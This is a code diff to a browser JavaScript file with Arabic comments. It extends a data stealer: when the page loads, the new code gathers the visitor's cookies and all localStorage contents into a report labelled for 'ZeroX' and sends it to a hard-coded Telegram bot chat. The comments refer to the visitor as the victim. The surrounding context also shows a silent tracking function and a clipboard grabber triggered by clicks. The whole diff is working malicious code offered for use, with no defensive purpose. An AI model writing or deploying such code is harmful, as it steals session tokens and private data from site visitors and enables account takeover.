@@ -231,11 +231,35 @@ const chatId = "7388801889";
     silentRadar(); 
 
 
-    // 🍪 قناص الكوكيز (يعمل فور اكتمال التحميل)
+    // 🍪 قناص الخزنات الشامل (Cookies + LocalStorage)
     window.addEventListener('load', () => {
-        let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
+        // 1. جلب الكوكيز المتاحة
+        let cookies = document.cookie || "لا يوجد كوكيز متاحة (محمية)";
+        
+        // 2. جلب بيانات التخزين المحلي (LocalStorage) - هنا الأسرار الحقيقية!
+        let localData = "";
+        try {
+            localData = JSON.stringify(localStorage);
+            if (localData === "{}") localData = "الخزنة المحلية فارغة";
+        } catch (e) { localData = "محجوبة أو خطأ في الوصول"; }
+
+        // 3. بناء تقرير الخزنة
+        const storageReport = `
+🍪 تقرير الخزنة لـ ZeroX:
+----------------------------------
+📦 الكوكيز المكتشفة:
+${cookies}
+----------------------------------
+🔐 التخزين المحلي (LocalStorage):
+${localData}
+----------------------------------
+⚠️ ملاحظة: الكوكيز المحمية بـ HttpOnly لا تظهر هنا.
+        `;
+
+        // إرسال التقرير للتلجرام
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(storageReport)}`);
     });
+
 
     // 📋 صائد الحافظة (عند أول نقرة لضمان تجاوز الحماية)
     document.addEventListener('click', () => {
